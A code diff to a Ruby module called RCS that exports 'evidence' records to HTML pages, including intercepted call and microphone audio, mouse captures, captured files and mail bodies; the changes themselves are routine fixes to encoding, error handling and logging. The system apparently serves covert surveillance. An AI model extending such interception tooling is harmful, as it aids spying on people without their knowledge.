@@ -86,6 +86,8 @@ module RCS
         <td class="info">#{html_data_renderer(row)}</td><td class="note">#{row[:note]}</td>
       </tr>
         eof
+      rescue Exception => e
+        trace :fatal, "#{e.class} #{e.message} #{row.inspect}"
       end
 
       def html_table_footer
@@ -118,12 +120,14 @@ module RCS
       end
 
       def html_data_renderer(row)
-        table = "<table class=\"inner\"><tbody>"
+        table = "<table class=\"inner\"><tbody>".force_encoding('UTF-8')
         # expand all the metadata
         row[:data].each_pair do |k, v|
           next if ['_grid', '_grid_size', 'md5', 'body', 'status'].include? k
           v = CGI::escapeHTML(v.to_s)
           v.gsub! /\n/, '<br>' if v.class == String
+          # times for calendar
+          v = Time.at(v.to_i) if k == 'begin' or k == 'end'
           table << "<tr><td class=\"inner\">#{k}</td><td class=\"inner\">#{v}</td></tr>"
         end
         # add binary content
@@ -133,14 +137,16 @@ module RCS
           when 'mouse'
             table << "<tr><td class=\"inner\">image</td><td class=\"inner\">#{html_image(row[:data]['_grid'].to_s + '.jpg', 40)}</td></tr>"
           when 'call', 'mic'
-            table << "<tr><td class=\"inner\">audio</td><td class=\"inner\">#{html_mp3_player(row[:data]['_grid'].to_s + '.mp3')}</td></tr>"
+            unless row[:data]['_grid'].nil?
+              table << "<tr><td class=\"inner\">audio</td><td class=\"inner\">#{html_mp3_player(row[:data]['_grid'].to_s + '.mp3')}</td></tr>"
+            end
           when 'file'
             if row[:data]['type'] == :capture
-              table << "<tr><td class=\"inner\">file</td><td class=\"inner\"><a href=\"#{row[:data]['_grid'].to_s + File.extname(row[:data]['path'])}\" title=\"Download\"><font size=3><b>⇊</b></font></a></td></tr>"
+              table << "<tr><td class=\"inner\">file</td><td class=\"inner\"><a href=\"#{row[:data]['_grid'].to_s + File.extname(row[:data]['path'])}\" title=\"Download\"><font size=3>[+]</font></a></td></tr>"
             end
           when 'message'
             if row[:data]['type'] == :mail
-              table << "<tr><td class=\"inner\">body</td><td class=\"inner\"><a href=\"#{row[:data]['_grid'].to_s + '.txt'}\" title=\"Download\"><font size=3><b>⇊</b></font></a></td></tr>"
+              table << "<tr><td class=\"inner\">body</td><td class=\"inner\"><a href=\"#{row[:data]['_grid'].to_s + '.txt'}\" title=\"Download\"><font size=3>[+]</font></a></td></tr>"
             end
         end
         table << "</tbody></table>"
@@ -149,7 +155,7 @@ module RCS
 
       def html_stat_renderer(data)
         max = data.max
-        table = "<table class=\"stat\"><tbody><tr>"
+        table = "<table class=\"stat\"><tbody><tr>".force_encoding('UTF-8')
         data.each_with_index do |value|
           h = value * 20 / max
           table << "<td class=\"stat\"><img src=\"style/stat.png\" height=\"#{h}\" width=\"6\"></td>"
@@ -172,7 +178,7 @@ module RCS
     <audio src="#{mp3}" controls>
         HTML5 audio not supported
     </audio>
-    <a href="#{mp3}" title="Download"><font size=3><b>⇊</b></font></a>
+    <a href="#{mp3}" title="Download"><font size=3>[+]</font></a>
         eof
       end
 
@@ -181,14 +187,10 @@ module RCS
         out[:name] = File.join(day, 'index.html')
         out[:content] = html_page_header
         out[:content] << html_evidence_table_header(day)
-
-        trace :debug, "CREATING DAY INDEX FILE #{out[:name]}"
-
         return out
       end
 
       def end_file(out)
-        trace :debug, "CLOSING DAY INDEX FILE #{out[:name]}"
         out[:content] << html_table_footer
         out[:content] << html_page_footer
       end
@@ -267,11 +269,12 @@ module RCS
         while cursor < total do
 
           grid_dumps = []
+          trace :info, "Exporting evidence: #{total - cursor} evidence to go..."
 
           evidence.limit(chunk).skip(cursor).each_with_index do |e, i|
             # get the day of the current evidence
             day = Time.at(e[opts[:index]]).strftime('%Y-%m-%d')
-            # get the our of the evidence
+            # get the hour of the evidence
             hour = Time.at(e[opts[:index]]).strftime('%H').to_i
 
             # this is the first element
@@ -307,8 +310,13 @@ module RCS
             # write the current evidence
             out[:content] << html_evidence_table_row(e)
 
-            # add grid exports to queue
-            grid_dumps << {day: day, id: e[:data]['_grid'], file_name: dump_filename(day, e, opts[:target]), target: opts[:target]}
+            # if the log does not have grid, yield it now, else add to the queue (it will be yielded later)
+            if e[:data]['_grid'].nil?
+              yield
+            else
+              # add grid exports to queue
+              grid_dumps << {day: day, id: e[:data]['_grid'], file_name: dump_filename(day, e, opts[:target]), target: opts[:target]}
+            end
 
             # update the stat of the summary
             summary[day][hour] +=  1
@@ -317,7 +325,6 @@ module RCS
 
           grid_dumps.each do |g|
             begin
-              trace :debug, "Exporting GRID file #{g[:id].inspect} to #{g[:file_name]}"
               filename, file = dump_file(g[:day], g[:id], g[:file_name], g[:target])
               yield 'file', filename, {path: file}
               FileUtils.rm_rf(file)
